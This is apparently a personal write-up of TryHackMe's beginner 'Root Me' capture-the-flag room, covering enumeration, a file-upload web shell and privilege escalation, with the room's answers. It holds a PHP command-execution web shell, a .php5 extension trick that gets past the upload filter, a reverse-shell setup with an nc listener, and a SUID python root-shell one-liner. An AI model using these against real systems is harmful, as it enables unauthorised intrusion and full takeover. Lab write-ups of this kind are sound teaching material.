{Title}
## **Introduction**

📊 Difficulty : Easy

Root Me a room available on [TryHackMe](https://tryhackme.com) describing itself as a CTF for beginners tackling web exploitation from enumeration to privilege escalation.

Link to the room : https://tryhackme.com/room/rrootme

--- 
# **Reconnaissance**

> *First, let's get information about the target.*

As per usual when attacking a system, the first step is to enumerate open ports for potential entry points. Using our beloved `nmap`, we find 2 open ports on the target machine.

```
nmap MACHINE_IP
```

![[20250829-Root Me.png]]

We find that port 80 is open, meaning that the target system is hosting a web page. Let's access it. 

![[20250829-Root Me-1.png]]

By opening the Inspect tool and going to the Networking tab, we can view the `GET` request made by our client when requesting the web page, as well as the response provided by the server. In the header of said response, we'll usually be looking for Set-Cookie, Web Server name and versions. In our case, we get that the web server of the web page is Apache/2.4.41. This information can be useful if we were to search for vulnerabilities and exploits associated with this specific version of the web server. 

![[20250829-Root Me-2.png]]

The web page doesn't seem to have anything interesting for us to exploit. Maybe we should try to enumerate for hidden directories using tools like `dirb` or `GoBuster` : 

```
gobuster dir -u http://MACHINE_IP -w WORDLIST
```

I used the pre-installed wordlist `common.txt` from Kali Linux located at `/usr/share/dirb/wordlists`.

![[20250829-Root Me-3.png]]

We find multiple directories. We can take a look at each one, but the one that interests us is the ```panel``` directory. Accessing it, we obtain a page allowing users to upload files. When clicking the Upload button, we are presented with a message stating that our file has been successfully archived. 

![[20250829-Root Me-4.png]]

We can click the ``Veja!`` text to view the file, which is stored in the `/uploads` directory.

![[20250829-Root Me-5.png]]


### Q. Scan the machine, how many ports are open?

**Answer** : 2

### Q. What version of Apache is running?

**Answer** : Apache/2.4.41

### Q. What service is running on port 22?

**Answer** : ssh

### Q. Find directories on the web server using the GoBuster tool.  

### Q. What is the hidden directory?

**Answer** : /panel


# Getting a shell

> *Find a form to upload and get a reverse shell, and find the flag.*

Using the previously found directory, we quickly understand that we can obtain a web shell by uploading `.php` files to make the server execute specific commands.

Let's create our payload : 

```
nano script.php
```

```
`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`
```

Now that our file is ready, let's try to upload it.

![[20250829-Root Me-6.png|509x349]]

It seems the website has a filter to block `.php` scripts from being uploaded. That would have been a problem if there weren't so many ways to bypass this filter. After doing a bit of research, I found that multiple extensions could do the trick as some filters are programmed to stop reading file names after encountering the first file extension.

I tried renaming the script to `script.jpg.php`. It didn't work.

I found that different file extensions could be used to execute PHP scripts, including ``.php5`` and ``.phtml``. So I renamed the file to `script.php5` and it worked ! The script was successfully uploaded to the web server.

Now, we are free to execute whichever command we want by injecting commands directly in the URL bar using the following syntax : 

```
http://MACHINE_IP/uploads/script.php5?cmd=COMMAND
```

![[20250829-Root Me-7.png]]

Using this web shell, we manage to find the ``user.txt`` file and obtain the flag : 

```
http://MACHINE_IP/uploads/script.php5?cmd=find / -type f -name user.txt
```
![[20250829-Root Me-8.png]]

```
http://MACHINE_IP/uploads/script.php5?cmd=cat /var/www/user.txt
```

## Privilege Escalation

> *Now that we have a shell, let's escalate our privileges to root.*

Typical ways to find privilege escalation vectors include :
- running `sudo -l`
- looking at scheduled tasks in `/etc/crontab`
- looking for binaries with the SUID bit set

Since neither sudo -l and /etc/crontab neither return anything of interest, let's look at the processes with the SUID bit set : 

```
find / -type f -perm -04000 -ls 2>/dev/null
```

![[20250829-Root Me-9.png]]

We find that python, owned by root, has the SUID bit set. Searching on [GTFObins](https://gtfobins.github.io/), we find that python can be used to perform privilege escalation by running the following command : 

```
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

And it is here that I found myself stuck. Although the script I injected enabled me to execute commands via the URL bar, the shell wasn’t interactive. This meant I couldn’t use the output of previous commands as input for new ones. The command listed on [GTFOBins](https://gtfobins.github.io/?utm_source=chatgpt.com) uses the `os.execl` function to spawn a new shell, but in my current setup, I had no way to interact with that new shell.

I had to find something else.

After a bit of searching, I stumbled upon a PHP script allowing an attacker to obtain a shell on a listening port.

Link to the script : https://github.com/pentestmonkey/php-reverse-shell

![[20250829-Root Me-10.png]]

Changing the IP and port to the ones of the attacker, we can upload the script and launch a listener on our machine to receive the connection : 

```
nc -nlvp 1234
```

![[20250829-Root Me-11.png]]

Now we can run the command previously discussed command :

![[20250829-Root Me-12.png]]

We successfully escalated our privilege. We can now go to /root to obtain the flag and complete the room.

### Q. Search for files with SUID permission, which file is weird?

Answer : python


---
# Conclusion 

Root Me is a pretty popular room on [TryHackMe](https://tryhackme.com) and for good reasons. It successfully manages to guide users through the different stages of web exploitation and showcases how easily attackers can enter a system if the latter isn't properly secured. 